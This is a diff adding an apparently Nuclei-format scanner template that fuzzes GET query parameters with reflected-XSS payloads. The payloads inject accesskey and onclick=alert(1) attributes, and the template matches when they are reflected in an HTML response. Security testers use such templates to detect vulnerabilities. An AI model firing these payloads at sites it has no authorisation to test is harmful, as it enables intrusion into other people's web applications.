@@ -1,0 +1,42 @@
+id: alt-shift-x-xss
+
+info:
+  name: ALT Shift XSS GET Parameters
+  author: reewardius
+  severity: medium
+  reference: https://medium.com/bug-bounty-hunting/how-i-found-a-surprising-xss-vulnerability-on-oracle-netsuite-2d48b7fcf0c8
+  tags: fuzzing-xss,fuzzing-req
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      xss:
+        - "xlmav%2522accesskey%253d%2522x%2522onclick%253d%2522alert%281%29%2522%252f%252fwzraf"
+        - 'xlmav"accesskey="x"onclick="alert(1)"//wzraf'
+        - 'xlmav "accesskey="x" onclick="alert(1)"'
+        
+    fuzzing:
+      - part: query
+        type: replace
+        mode: multiple
+        fuzz:
+          - "{{xss}}"
+        
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'xlmav "accesskey="x" onclick="alert(1)"'
+          - 'xlmav"accesskey="x"onclick="alert(1)"'
+          - '"accesskey="x" onclick="alert(1)"'
+        condition: or
+        
+      - type: word
+        part: header
+        words:
+          - text/html
